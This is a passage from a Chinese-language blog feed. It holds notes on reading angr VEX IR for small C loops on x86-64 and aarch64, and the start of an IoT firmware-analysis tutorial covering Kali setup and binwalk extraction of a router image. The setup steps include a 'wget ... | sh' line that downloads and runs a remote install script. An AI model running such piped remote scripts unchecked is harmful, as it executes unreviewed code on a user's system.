Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   03 | t29 = LDle:I32(t26)</span><br><span class="line">   04 | t28 = 32Uto64(t29)</span><br><span class="line">   05 | ------ IMark(0x401166, 3, 0) ------</span><br><span class="line">   06 | t30 = 64to32(t28)</span><br><span class="line">   07 | t1 = Add32(t30,0x00000001)</span><br><span class="line">   08 | t34 = 32Uto64(t1)</span><br><span class="line">   09 | ------ IMark(0x401169, 3, 0) ------</span><br><span class="line">   10 | t36 = 64to32(t34)</span><br><span class="line">   11 | t35 = 32Sto64(t36)</span><br><span class="line">   12 | PUT(rip) = 0x000000000040116c</span><br><span class="line">   13 | ------ IMark(0x40116c, 4, 0) ------</span><br><span class="line">   14 | t40 = Shl64(t35,0x02)</span><br><span class="line">   15 | t39 = Add64(t27,t40)</span><br><span class="line">   16 | t38 = Add64(t39,0xffffffffffffffe0)</span><br><span class="line">   17 | t44 = LDle:I32(t38)</span><br><span class="line">   18 | t43 = 32Uto64(t44)</span><br><span class="line">   19 | PUT(rip) = 0x0000000000401170</span><br><span class="line">   20 | ------ IMark(0x401170, 4, 0) ------</span><br><span class="line">   21 | t45 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   22 | t48 = LDle:I32(t45)</span><br><span class="line">   23 | t47 = 32Sto64(t48)</span><br><span class="line">   24 | PUT(rip) = 0x0000000000401174</span><br><span class="line">   25 | ------ IMark(0x401174, 4, 0) ------</span><br><span class="line">   26 | t51 = Shl64(t47,0x02)</span><br><span class="line">   27 | t50 = Add64(t27,t51)</span><br><span class="line">   28 | t49 = Add64(t50,0xffffffffffffffe0)</span><br><span class="line">   29 | t54 = 64to32(t43)</span><br><span class="line">   30 | t7 = LDle:I32(t49)</span><br><span class="line">   31 | t6 = Add32(t54,t7)</span><br><span class="line">   32 | t58 = 32Uto64(t6)</span><br><span class="line">   33 | PUT(rip) = 0x0000000000401178</span><br><span class="line">   34 | ------ IMark(0x401178, 4, 0) ------</span><br><span class="line">   35 | t61 = Shl64(t47,0x02)</span><br><span class="line">   36 | t60 = Add64(t27,t61)</span><br><span class="line">   37 | t59 = Add64(t60,0xffffffffffffffe0)</span><br><span class="line">   38 | t64 = 64to32(t58)</span><br><span class="line">   39 | STle(t59) = t64</span><br><span class="line">   40 | PUT(rip) = 0x000000000040117c</span><br><span class="line">   41 | ------ IMark(0x40117c, 4, 0) ------</span><br><span class="line">   42 | t66 = Add64(t27,0xffffffffffffffd8)</span><br><span class="line">   43 | t68 = LDle:I64(t66)</span><br><span class="line">   44 | PUT(rip) = 0x0000000000401180</span><br><span class="line">   45 | ------ IMark(0x401180, 4, 0) ------</span><br><span class="line">   46 | t69 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   47 | t72 = LDle:I32(t69)</span><br><span class="line">   48 | t71 = 32Sto64(t72)</span><br><span class="line">   49 | PUT(rip) = 0x0000000000401184</span><br><span class="line">   50 | ------ IMark(0x401184, 5, 0) ------</span><br><span class="line">   51 | t75 = Shl64(t71,0x02)</span><br><span class="line">   52 | t74 = Add64(t27,t75)</span><br><span class="line">   53 | t73 = Add64(t74,0xffffffffffffffe0)</span><br><span class="line">   54 | t79 = LDle:I32(t73)</span><br><span class="line">   55 | t78 = 32Sto64(t79)</span><br><span class="line">   56 | ------ IMark(0x401189, 4, 0) ------</span><br><span class="line">   57 | t16 = Mul64(t78,t68)</span><br><span class="line">   58 | ------ IMark(0x40118d, 3, 0) ------</span><br><span class="line">   59 | ------ IMark(0x401190, 2, 0) ------</span><br><span class="line">   60 | t81 = Sar64(t16,0x3f)</span><br><span class="line">   61 | ------ IMark(0x401192, 5, 0) ------</span><br><span class="line">   62 | PUT(rcx) = 0x0000000000000002</span><br><span class="line">   63 | ------ IMark(0x401197, 3, 0) ------</span><br><span class="line">   64 | t84 = 64HLto128(t81,t16)</span><br><span class="line">   65 | t106 = CmpEQ64(0x0000000000000002,0x0000000000000000)</span><br><span class="line">   66 | if (t106) &#123; PUT(rip) = 0x401197; Ijk_SigFPE_IntDiv &#125;</span><br><span class="line">   67 | t19 = DivModS128to64(t84,0x0000000000000002)</span><br><span class="line">   68 | t88 = 128HIto64(t19)</span><br><span class="line">   69 | PUT(rdx) = t88</span><br><span class="line">   70 | PUT(rip) = 0x000000000040119a</span><br><span class="line">   71 | ------ IMark(0x40119a, 4, 0) ------</span><br><span class="line">   72 | t89 = Add64(t27,0xffffffffffffffd8)</span><br><span class="line">   73 | STle(t89) = t88</span><br><span class="line">   74 | PUT(rip) = 0x000000000040119e</span><br><span class="line">   75 | ------ IMark(0x40119e, 3, 0) ------</span><br><span class="line">   76 | t92 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   77 | t95 = LDle:I32(t92)</span><br><span class="line">   78 | t94 = 32Uto64(t95)</span><br><span class="line">   79 | ------ IMark(0x4011a1, 3, 0) ------</span><br><span class="line">   80 | t96 = 64to32(t94)</span><br><span class="line">   81 | t22 = Add32(t96,0x00000001)</span><br><span class="line">   82 | PUT(cc_op) = 0x0000000000000003</span><br><span class="line">   83 | t98 = 32Uto64(t96)</span><br><span class="line">   84 | PUT(cc_dep1) = t98</span><br><span class="line">   85 | PUT(cc_dep2) = 0x0000000000000001</span><br><span class="line">   86 | t100 = 32Uto64(t22)</span><br><span class="line">   87 | PUT(rax) = t100</span><br><span class="line">   88 | PUT(rip) = 0x00000000004011a4</span><br><span class="line">   89 | ------ IMark(0x4011a4, 3, 0) ------</span><br><span class="line">   90 | t101 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   91 | t103 = 64to32(t100)</span><br><span class="line">   92 | STle(t101) = t103</span><br><span class="line">   93 | ------ IMark(0x4011a7, 5, 0) ------</span><br><span class="line">   NEXT: PUT(rip) = 0x0000000000401159; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>angr的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.pp()</span><br><span class="line">0x401163:	mov	eax, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401166:	add	eax, 1</span><br><span class="line">0x401169:	movsxd	rcx, eax</span><br><span class="line">0x40116c:	mov	eax, dword ptr [rbp + rcx*4 - 0x20]</span><br><span class="line">0x401170:	movsxd	rcx, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401174:	add	eax, dword ptr [rbp + rcx*4 - 0x20]</span><br><span class="line">0x401178:	mov	dword ptr [rbp + rcx*4 - 0x20], eax</span><br><span class="line">0x40117c:	mov	rcx, qword ptr [rbp - 0x28]</span><br><span class="line">0x401180:	movsxd	rdx, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401184:	movsxd	rdx, dword ptr [rbp + rdx*4 - 0x20]</span><br><span class="line">0x401189:	imul	rcx, rdx</span><br><span class="line">0x40118d:	mov	rax, rcx</span><br><span class="line">0x401190:	cqo	</span><br><span class="line">0x401192:	mov	ecx, 2</span><br><span class="line">0x401197:	idiv	rcx</span><br><span class="line">0x40119a:	mov	qword ptr [rbp - 0x28], rdx</span><br><span class="line">0x40119e:	mov	eax, dword ptr [rbp - 0x2c]</span><br><span class="line">0x4011a1:	add	eax, 1</span><br><span class="line">0x4011a4:	mov	dword ptr [rbp - 0x2c], eax</span><br><span class="line">0x4011a7:	jmp	0x401159</span><br></pre></td></tr></table></figure>
<p>这段代码是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">	a[i]+=a[i+<span class="number">1</span>];</span><br><span class="line">	j=j*a[i]%<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>的循环部分</p>
<p>01~04：执行后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t26=rbp-0x2c</span><br><span class="line">t29=dowrd ptr [rbp-0x2c]=eax</span><br><span class="line">t28=eax(64bits)</span><br></pre></td></tr></table></figure>
<p>结合下一步的操作，不是很懂意义何在…</p>
<p>11行：出现了vex ir 指令，Sto，S指的是singed widen；类似的Uto中，U指的是unsigned widen<br>
对于这行代码的理解可以参考汇编中的movsxd：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> MOVSXD r64, r/m32       Move doubleword to quadword with sign-extension.</span><br><span class="line">这是64位代码的指令，该指令将32位寄存器或地址转换为32位值，并将其符号扩展为64位寄存器。符号扩展是获取源的最高位（符号位）的值，并使用它来填充目标的所有高位。</span><br></pre></td></tr></table></figure>
<p>到57行前都是些重复的语句</p>
<p>57行：<br>
mul64：官方文档中写道，mul代表的是signless的，相对的有以下乘法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">      /* -- Ordering not important after here. -- */</span><br><span class="line">      ...</span><br><span class="line">      /* Widening multiplies */</span><br><span class="line">      Iop_MullS8, Iop_MullS16, Iop_MullS32, Iop_MullS64,</span><br><span class="line">      Iop_MullU8, Iop_MullU16, Iop_MullU32, Iop_MullU64,</span><br><span class="line"></span><br><span class="line">(看上去和arm的精简指令集挺像的)</span><br></pre></td></tr></table></figure>
<p>看到这行产生了个疑惑：imul是带符号的，但mul64是个无符号的乘法<br>
再往下看看，发现，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t16=Mul64(t78,t68)</span><br><span class="line">t81=Sar64(t16,0x3f)</span><br></pre></td></tr></table></figure>
<p>完成了以下三条汇编指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x401189:	imul	rcx, rdx</span><br><span class="line">0x40118d:	mov	rax, rcx</span><br><span class="line">0x401190:	cqo	</span><br></pre></td></tr></table></figure>
<p>sar64：官方文档中没有描述作用，猜测和x64汇编相似，即算术右移（用符号位补）<br>
cqo：将rax中的符号复制到rdx的每个位上</p>
<p>64~70行：<br>
简单的一条</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idiv rcx</span><br></pre></td></tr></table></figure>
<p>被转换成了七行ir</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64 | t84 = 64HLto128(t81,t16)</span><br><span class="line">65 | t106 = CmpEQ64(0x0000000000000002,0x0000000000000000)</span><br><span class="line">66 | if (t106) &#123; PUT(rip) = 0x401197; Ijk_SigFPE_IntDiv &#125;</span><br><span class="line">67 | t19 = DivModS128to64(t84,0x0000000000000002)</span><br><span class="line">68 | t88 = 128HIto64(t19)</span><br><span class="line">69 | PUT(rdx) = t88</span><br><span class="line">70 | PUT(rip) = 0x000000000040119a</span><br></pre></td></tr></table></figure>
<p>涉及到了几个没有见过的VEX IR 指令：<br>
64HLto128：两个64位的寄存器里的值组合扩展到128位的寄存器中<br>
DivModS128to64：:: V128,I64 -&gt; V128，of which lo half is div and hi half is mod<br>
128HIto64：128位数据中的高64位复制到64位寄存器中</p>
<p>82~85行，出现了“cc_*”的“寄存器”，但似乎对理解这个基本块的VEX IR完全没有影响…（不会是因为代码片段还不够长吧orz）</p>
<h3 id="第二段">第二段</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.vex.pp()</span><br><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I64 t4:Ity_I64 t5:Ity_I64 t6:Ity_I64 t7:Ity_I64 t8:Ity_I1 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64 t14:Ity_I64 t15:Ity_I64 t16:Ity_I64 t17:Ity_I1 t18:Ity_I32 t19:Ity_I32 t20:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x401159, 4, 0) ------</span><br><span class="line">   01 | t5 = GET:I64(rbp)</span><br><span class="line">   02 | t4 = Add64(t5,0xffffffffffffffd4)</span><br><span class="line">   03 | t2 = LDle:I32(t4)</span><br><span class="line">   04 | PUT(cc_op) = 0x0000000000000007</span><br><span class="line">   05 | t15 = 32Uto64(t2)</span><br><span class="line">   06 | t6 = t15</span><br><span class="line">   07 | PUT(cc_dep1) = t6</span><br><span class="line">   08 | PUT(cc_dep2) = 0x0000000000000003</span><br><span class="line">   09 | PUT(rip) = 0x000000000040115d</span><br><span class="line">   10 | ------ IMark(0x40115d, 6, 0) ------</span><br><span class="line">   11 | t18 = 64to32(0x0000000000000003)</span><br><span class="line">   12 | t19 = 64to32(t6)</span><br><span class="line">   13 | t17 = CmpLT32S(t19,t18)</span><br><span class="line">   14 | t16 = 1Uto64(t17)</span><br><span class="line">   15 | t13 = t16</span><br><span class="line">   16 | t20 = 64to1(t13)</span><br><span class="line">   17 | t8 = t20</span><br><span class="line">   18 | if (t8) &#123; PUT(rip) = 0x401163; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(rip) = 0x00000000004011ac; Ijk_Boring</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反汇编结果：</span><br><span class="line">```asm</span><br><span class="line">0x401159:	cmp	dword ptr [rbp - 0x2c], 3</span><br><span class="line">0x40115d:	jge	0x4011ac</span><br></pre></td></tr></table></figure>
<p>第一部分13行：cmpLT32S<br>
官方文档中的解释很短：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Standard integer comparisons */</span><br><span class="line">Iop_CmpLT32S, Iop_CmpLT64S,</span><br><span class="line">Iop_CmpLE32S, Iop_CmpLE64S,</span><br><span class="line">Iop_CmpLT32U, Iop_CmpLT64U,</span><br><span class="line">Iop_CmpLE32U, Iop_CmpLE64U,</span><br></pre></td></tr></table></figure>
<p>该结果为在x86汇编中为指令jge服务（大于等于则跳转）<br>
所以小于3时t8=t20=t16=1<br>
因此cmpLT应该是“前小于后返回1”<br>
所以&quot;CmpL*&quot;是只能比较小于或等于？</p>
<p><em>注：试了一下还真是这样的，形成的中间代码会把其他判断方式转换成&quot;&lt;“/”=&quot;</em><br>
<em>注2：在微软的文档搜到了SSE2指令集，里边的比较指令和 vex ir 长得还蛮像的↓</em><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210516225639.png" alt="20210516225639"></p>
<h2 id="来个aarch64的">来个aarch64的</h2>
<p>用aarch64-linux-gnu-gcc编译了相同的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">a</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line">	<span class="keyword">int</span>* b;</span><br><span class="line">&#125;aa;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">double</span> b=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">	<span class="keyword">switch</span>(a)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a=2&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a=1&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a==null&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;aa.a);</span><br><span class="line">	aa.b = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (aa.a ==a)</span><br><span class="line">		aa.b[<span class="number">1</span>] = aa.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用angr加载的时候会产生警告，但（对于这个样例）没有影响<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510184101.png" alt="20210510184101"><br>
<em>注：上一个应该是因为找不到动态链接库，编译选项设置静态编译后可以正常加载</em></p>
<p>发现vex ir用到的寄存器是根据程序cpu架构改变的。如i386、amd64下用到PUT(rip)、PUT(eip)，在aarch64下则是PUT(pc)</p>
<p>选取下面这句代码的中间代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_DWORD *)(qword_4999C8 + <span class="number">4</span>) = aa;</span><br></pre></td></tr></table></figure>
<h3 id="aarch64">aarch64</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510213959.png" alt="20210510213959"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   00 | ------ IMark(0x400778, 4, 0) ------</span><br><span class="line">   01 | ------ IMark(0x40077c, 4, 0) ------</span><br><span class="line">   02 | PUT(pc) = 0x0000000000400780</span><br><span class="line">   03 | ------ IMark(0x400780, 4, 0) ------</span><br><span class="line">   04 | t4 = LDle:I64(0x00000000004999c8)</span><br><span class="line">   05 | ------ IMark(0x400784, 4, 0) ------</span><br><span class="line">   06 | t7 = Add64(t4,0x0000000000000004)</span><br><span class="line">   07 | ------ IMark(0x400788, 4, 0) ------</span><br><span class="line">   08 | ------ IMark(0x40078c, 4, 0) ------</span><br><span class="line">   09 | PUT(pc) = 0x0000000000400790</span><br><span class="line">   10 | ------ IMark(0x400790, 4, 0) ------</span><br><span class="line">   11 | t34 = LDle:I32(0x00000000004999c0)</span><br><span class="line">   12 | t57 = 32Uto64(t34)</span><br><span class="line">   13 | t33 = t57</span><br><span class="line">   14 | PUT(pc) = 0x0000000000400794</span><br><span class="line">   15 | ------ IMark(0x400794, 4, 0) ------</span><br><span class="line">   16 | t58 = 64to32(t33)</span><br><span class="line">   17 | t37 = t58</span><br><span class="line">   18 | STle(t7) = t37</span><br><span class="line">   19 | ------ IMark(0x400798, 4, 0) ------</span><br><span class="line">   20 | ------ IMark(0x40079c, 4, 0) ------</span><br><span class="line">   21 | PUT(x1) = 0x0000000000000000</span><br><span class="line">   22 | ------ IMark(0x4007a0, 4, 0) ------</span><br><span class="line">   23 | PUT(pc) = 0x00000000004007a4</span><br><span class="line">   24 | ------ IMark(0x4007a4, 4, 0) ------</span><br><span class="line">   25 | t19 = LDle:I64(0x0000000000497f50)</span><br><span class="line">   26 | PUT(x0) = t19</span><br><span class="line">   27 | PUT(pc) = 0x00000000004007a8</span><br><span class="line">   28 | ------ IMark(0x4007a8, 4, 0) ------</span><br><span class="line">   29 | t46 = GET:I64(xsp)</span><br><span class="line">   30 | t45 = Add64(t46,0x0000000000000028)</span><br><span class="line">   31 | t21 = LDle:I64(t45)</span><br><span class="line">   32 | PUT(pc) = 0x00000000004007ac</span><br><span class="line">   33 | ------ IMark(0x4007ac, 4, 0) ------</span><br><span class="line">   34 | t23 = LDle:I64(t19)</span><br><span class="line">   35 | ------ IMark(0x4007b0, 4, 0) ------</span><br><span class="line">   36 | t27 = Sub64(t21,t23)</span><br><span class="line">   37 | PUT(x2) = t27</span><br><span class="line">   38 | PUT(cc_op) = 0x0000000000000004</span><br><span class="line">   39 | PUT(cc_dep1) = t21</span><br><span class="line">   40 | PUT(cc_dep2) = t23</span><br><span class="line">   41 | PUT(cc_ndep) = 0x0000000000000000</span><br><span class="line">   42 | ------ IMark(0x4007b4, 4, 0) ------</span><br><span class="line">   43 | PUT(x3) = 0x0000000000000000</span><br><span class="line">   44 | PUT(pc) = 0x00000000004007b8</span><br><span class="line">   45 | ------ IMark(0x4007b8, 4, 0) ------</span><br><span class="line">   46 | t60 = CmpEQ64(t21,t23)</span><br><span class="line">   47 | t59 = 1Uto64(t60)</span><br><span class="line">   48 | t55 = t59</span><br><span class="line">   49 | t61 = 64to1(t55)</span><br><span class="line">   50 | t49 = t61</span><br><span class="line">   51 | if (t49) &#123; PUT(pc) = 0x4007c0; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(pc) = 0x00000000004007bc; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="amd64">amd64</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510213751.png" alt="20210510213751"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   00 | ------ IMark(0x40126d, 7, 0) ------</span><br><span class="line">   01 | t9 = LDle:I64(0x0000000000404028)</span><br><span class="line">   02 | ------ IMark(0x401274, 4, 0) ------</span><br><span class="line">   03 | t10 = Add64(t9,0x0000000000000004)</span><br><span class="line">   04 | PUT(rdx) = t10</span><br><span class="line">   05 | PUT(rip) = 0x0000000000401278</span><br><span class="line">   06 | ------ IMark(0x401278, 6, 0) ------</span><br><span class="line">   07 | t13 = LDle:I32(0x0000000000404020)</span><br><span class="line">   08 | t29 = 32Uto64(t13)</span><br><span class="line">   09 | t12 = t29</span><br><span class="line">   10 | PUT(rip) = 0x000000000040127e</span><br><span class="line">   11 | ------ IMark(0x40127e, 2, 0) ------</span><br><span class="line">   12 | t30 = 64to32(t12)</span><br><span class="line">   13 | t14 = t30</span><br><span class="line">   14 | STle(t10) = t14</span><br><span class="line">   15 | ------ IMark(0x401280, 5, 0) ------</span><br><span class="line">   16 | PUT(rax) = 0x0000000000000000</span><br><span class="line">   17 | PUT(rip) = 0x0000000000401285</span><br><span class="line">   18 | ------ IMark(0x401285, 4, 0) ------</span><br><span class="line">   19 | t18 = GET:I64(rbp)</span><br><span class="line">   20 | t17 = Add64(t18,0xfffffffffffffff8)</span><br><span class="line">   21 | t19 = LDle:I64(t17)</span><br><span class="line">   22 | PUT(rip) = 0x0000000000401289</span><br><span class="line">   23 | ------ IMark(0x401289, 9, 0) ------</span><br><span class="line">   24 | t21 = GET:I64(fs)</span><br><span class="line">   25 | t20 = Add64(0x0000000000000028,t21)</span><br><span class="line">   26 | t6 = LDle:I64(t20)</span><br><span class="line">   27 | t5 = Xor64(t19,t6)</span><br><span class="line">   28 | PUT(cc_op) = 0x0000000000000014</span><br><span class="line">   29 | PUT(cc_dep1) = t5</span><br><span class="line">   30 | PUT(cc_dep2) = 0x0000000000000000</span><br><span class="line">   31 | PUT(rcx) = t5</span><br><span class="line">   32 | PUT(rip) = 0x0000000000401292</span><br><span class="line">   33 | ------ IMark(0x401292, 2, 0) ------</span><br><span class="line">   34 | t32 = CmpEQ64(t5,0x0000000000000000)</span><br><span class="line">   35 | t31 = 1Uto64(t32)</span><br><span class="line">   36 | t27 = t31</span><br><span class="line">   37 | t33 = 64to1(t27)</span><br><span class="line">   38 | t22 = t33</span><br><span class="line">   39 | if (t22) &#123; PUT(rip) = 0x401299; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(rip) = 0x0000000000401294; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>课题</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT固件分析入门</title>
    <url>/3607.html</url>
    <content><![CDATA[<blockquote>
<p>本文由<strong>本人</strong>首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQ1OTQ1">IoT固件分析入门 - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>不知道干啥，打算把前段时间GitHub 上 star 了的一个项目学一遍，地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0c0cmIzbi9Jb1RfU2VjX1R1dG9yaWFsLw==">IoT_Sec_Tutorial<i class="fa fa-external-link-alt"></i></span></p>
<p>访问慢的话，gitee上也有镜像可看<br>
目测纯固件，贼基础<br>
update：像是对《路由器0day》那本书部分内容的整理和补充</p>
<span id="more"></span>
<h1>0x0准备</h1>
<p>因为kali是刚上大学的时候装的，现在都出到2021了，我的版本还是2019，所以先升级一波</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot; | sudo tee /etc/apt/sources.list</span><br><span class="line">sudo apt update &amp;&amp; sudo apt -y full-upgrade</span><br><span class="line">[ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f</span><br></pre></td></tr></table></figure>
<ul>
<li>更新完后可以查看一下系统版本：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep VERSION /etc/os-release</span><br></pre></td></tr></table></figure>
<ul>
<li>更新系统时间（我的时间好像之前一直都不对orz）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install -y ntpdate</span><br><span class="line">rm -rf etc/localtime</span><br><span class="line">cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">ntpdate -u ntp.api.bz</span><br></pre></td></tr></table></figure>
<ul>
<li>切换shell（为啥升级后zsh没有直接变成默认orzz）<br>
先查看系统中有几种shell：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>
<p>kali自带了zsh，直接切换就行了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -i /etc/skel/.zshrc ~/</span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
<p>zsh配合oh-my-zsh比较好用，安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure>
<p>添加全路径显示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gedit ~/.oh-my-zsh/themes/robbyrussell.zsh-theme</span><br><span class="line"><span class="meta">#</span><span class="bash">然后把%&#123;<span class="variable">$fg</span>[cyan]%&#125;%c%&#123;<span class="variable">$reset_color</span>%&#125;的%c改为[<span class="variable">$PWD</span>]</span></span><br></pre></td></tr></table></figure>
<p>如果想用别的桌面系统：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --config x-session-manager</span><br></pre></td></tr></table></figure>
<h1>0x1提取固件</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">之前用过binwalk，但大多都是在misc题目里处理压缩文件、图片啥的，没有仔细看过binwalk的命令</span><br><span class="line">其实除了binwalk之外，还有其他的固件分析/提取工具，在GitHub上用“firmware analysis”之类的关键词能查到</span><br></pre></td></tr></table></figure>
<p>给了个华硕RT-N300路由器的固件，binwalk直接提取即可。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224600.png" alt="20210620224600"><br>
提取出来发现没有进行加密（…16年，这也太不安全了吧orz，不过现在基本都有了</p>
<p>可以看到这个路由器用的是squashfs文件系统</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620225019.png" alt="20210620225019">其中squashfs-root可用于分析了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。</span><br><span class="line"></span><br><span class="line">Squashfs是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。</span><br><span class="line"></span><br><span class="line">Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2）。路由器的根文件系统通常会按照Squashfs文件系统常用压缩格式中的一种进行打包，形成一个完整的Squashfs文件系统，然后与路由器操作系统的内核一起形成更新固件。</span><br><span class="line"></span><br><span class="line">由于squashFS可以在不需要解压的情况下直接挂载，因此有许多应用场景，例如：</span><br><span class="line">1、安装Linux时用的live cd</span><br><span class="line">2、小型嵌入式设备中的rootfs。rootfs一般以压缩好的形式存放在ROM中，如果开机时把整个rootfs都解压到内存里再读取，对于ROM和RAM容量一般都很小的小型嵌入式设备来说性价比太低。</span><br></pre></td></tr></table></figure>
<h2 id="Binwalk命令选项">Binwalk命令选项</h2>
<p>常规选项：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224159.png" alt="20210620224159"></p>
<p>提取选项：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224110.png" alt="20210620224110"></p>
<p>Diff：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224324.png" alt="20210620224324"></p>
<p>文件签名：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986195558.png" alt="1624986195558"></p>
<p>熵值：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986159726.png" alt="1624986159726"></p>
<p>Raw Compression：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986173336.png" alt="1624986173336"></p>
<h2 id="如何手动提取固件">如何手动提取固件</h2>
